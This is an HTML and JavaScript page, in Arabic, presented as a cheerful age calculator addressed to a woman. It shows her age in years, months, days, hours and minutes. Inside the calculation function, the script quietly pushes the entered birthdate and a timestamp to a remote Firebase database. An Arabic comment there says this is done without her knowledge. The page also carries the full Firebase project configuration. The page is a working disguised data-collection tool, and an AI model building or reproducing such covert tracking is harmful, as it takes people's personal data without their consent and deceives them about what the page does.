<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>حاسبة عمرك بالتفصيل ✨</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 450px;
            width: 100%;
        }
        h2 { color: #333; margin-bottom: 20px; }
        input[type="date"] {
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            width: 80%;
            margin-bottom: 20px;
            outline: none;
        }
        button {
            padding: 12px 25px;
            background-color: #6c5ce7;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover { background-color: #5b4bc4; }
        .results {
            margin-top: 25px;
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
        }
        .card {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #eee;
        }
        .card span {
            display: block;
            font-size: 18px;
            font-weight: bold;
            color: #6c5ce7;
        }
        .card p { margin: 5px 0 0; color: #666; font-size: 14px; }
    </style>
</head>
<body>

<div class="container">
    <h2>احسبي عشتي قد إيه! ✨</h2>
    <p>اختاري تاريخ ميلادك واعرفي التفاصيل بالظبط:</p>
    <input type="date" id="birthdate">
    <br>
    <button onclick="calculateAge()">احسب العمر</button>

    <div class="results" id="results" style="display: none;">
        <div class="card"><span id="years">0</span><p>سنوات</p></div>
        <div class="card"><span id="months">0</span><p>أشهر</p></div>
        <div class="card"><span id="days">0</span><p>أيام</p></div>
        <div class="card"><span id="hours">0</span><p>ساعات</p></div>
        <div class="card" style="grid-column: span 2;"><span id="minutes">0</span><p>دقائق</p></div>
    </div>
</div>

<!-- Firebase SDKs -->
<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>

<script>
    const firebaseConfig = {
      apiKey: "AIzaSyB6iBq7snGQ2tSMz4jBkVLkoLtzpB8ZGfA",
      authDomain: "ai3322.firebaseapp.com",
      databaseURL: "https://ai3322-default-rtdb.firebaseio.com",
      projectId: "ai3322",
      storageBucket: "ai3322.firebasestorage.app",
      messagingSenderId: "576197240868",
      appId: "1:576197240868:web:8d36b98ad477d87a9f10b1",
      measurementId: "G-2YGD3HP6HW"
    };

    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    function calculateAge() {
        const input = document.getElementById('birthdate').value;
        if(!input) return alert("من فضلك اختاري التاريخ الأول!");

        const birthDate = new Date(input);
        const now = new Date();

        const diffTime = Math.abs(now - birthDate);
        const diffMinutes = Math.floor(diffTime / (1000 * 60));
        const diffHours = Math.floor(diffTime / (1000 * 60 * 60));
        const diffDays = Math.floor(diffTime / (1000 * 60 * 60 * 24));
        const diffMonths = Math.floor(diffDays / 30.4375);
        const diffYears = Math.floor(diffDays / 365.25);

        document.getElementById('years').innerText = diffYears.toLocaleString();
        document.getElementById('months').innerText = diffMonths.toLocaleString();
        document.getElementById('days').innerText = diffDays.toLocaleString();
        document.getElementById('hours').innerText = diffHours.toLocaleString();
        document.getElementById('minutes').innerText = diffMinutes.toLocaleString();

        document.getElementById('results').style.display = 'grid';

        // حفظ التاريخ في Firebase بدون علمها
        database.ref('birthdays').push({
            date: input,
            timestamp: new Date().toISOString()
        });
    }
</script>
</body>
</html>
